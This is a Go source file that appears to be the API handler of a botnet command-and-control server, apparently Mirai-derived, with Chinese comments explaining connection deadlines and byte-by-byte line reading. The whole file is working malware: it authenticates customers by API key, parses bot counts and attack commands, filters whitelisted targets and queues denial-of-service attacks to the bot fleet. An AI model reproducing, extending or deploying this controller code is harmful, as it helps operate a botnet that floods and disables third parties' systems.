package main

import (
    "net"
    "time"
    "strings"
    "strconv"
)

type Api struct {
    conn    net.Conn
}

func NewApi(conn net.Conn) *Api {
    return &Api{conn}
}

func (this *Api) Handle() {
    var botCount int
    var apiKeyValid bool
    var userInfo AccountInfo

    // Get command
    //这里需要注意setDeadline和timesout的区别
    //前者是一个固定时间点，后者是一个可以不断复用的时间
    //简单来说对一个连接而言，设置Deadline之后，除非你重新调用SetDeadline，否则这个Deadline不会变化。
    //一次到时后，时间会永远继续往下走，如果不重新设置，这个ddl不会二次触发了。
    //前面也提了，Deadline是一个绝对的时间点。因此，如果要通过SetDeadline来设置timeout，就不得不在每次执行Read/Write前重新调用它。
    //你可能并不想直接调用SetDeadline方法，而是选择 net/http提供的更上层的方法。
    //不过上层的timeout方法都是基于Deadline来实现的。
    //ref：https://segmentfault.com/a/1190000016827032
    //      https://stackoverflow.com/questions/49358216/setdeadline-for-golang-tcp-connection
    this.conn.SetDeadline(time.Now().Add(60 * time.Second)) //设置当前时间+60s作为ddl
    cmd, err := this.ReadLine() 
    if err != nil {
        this.conn.Write([]byte("ERR|Failed reading line\r\n"))
        return
    }
    passwordSplit := strings.SplitN(cmd, "|", 2)    //以|对读取的数据进行分割
    if apiKeyValid, userInfo = database.CheckApiCode(passwordSplit[0]); !apiKeyValid {
        this.conn.Write([]byte("ERR|API code invalid\r\n"))
        return
    }
    botCount = userInfo.maxBots
    cmd = passwordSplit[1]
    if cmd[0] == '-' {
        countSplit := strings.SplitN(cmd, " ", 2)
        count := countSplit[0][1:]
        botCount, err = strconv.Atoi(count)
        if err != nil {
            this.conn.Write([]byte("ERR|Failed parsing botcount\r\n"))
            return
        }
        if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
            this.conn.Write([]byte("ERR|Specified bot count over limit\r\n"))
            return
        }
        cmd = countSplit[1]
    }

    atk, err := NewAttack(cmd, userInfo.admin)
    if err != nil {
        this.conn.Write([]byte("ERR|Failed parsing attack command\r\n"))
        return
    }
    buf, err := atk.Build()
    if err != nil {
        this.conn.Write([]byte("ERR|An unknown error occurred\r\n"))
        return
    }
    if database.ContainsWhitelistedTargets(atk) {
        this.conn.Write([]byte("ERR|Attack targetting whitelisted target\r\n"))
        return
    }
    if can, _ := database.CanLaunchAttack(userInfo.username, atk.Duration, cmd, botCount, 1); !can {
        this.conn.Write([]byte("ERR|Attack cannot be launched\r\n"))
        return
    }

    clientList.QueueBuf(buf, botCount, "")
    this.conn.Write([]byte("OK\r\n"))
}

//读取一行数据
func (this *Api) ReadLine() (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {   //循环读取。
        //一次只读取一个字节
        n, err := this.conn.Read(buf[bufPos:bufPos+1])  //读取【不管是连接缓冲区还是buf变量本身的空闲空间为空的时候，都会停止读取】，但是如果是传输过来的连接缓冲区先读取到空，则会返回err=io.EOF
        if err != nil || n != 1 {
            return "", err  //如果有误，就直接返回空字符和，err
        }
        //读取到EOF
        if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos-- 
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            return string(buf[:bufPos]), nil    //如果读取到\n或者\x00，就返回。
        }
        bufPos++
    }
    return string(buf), nil
}
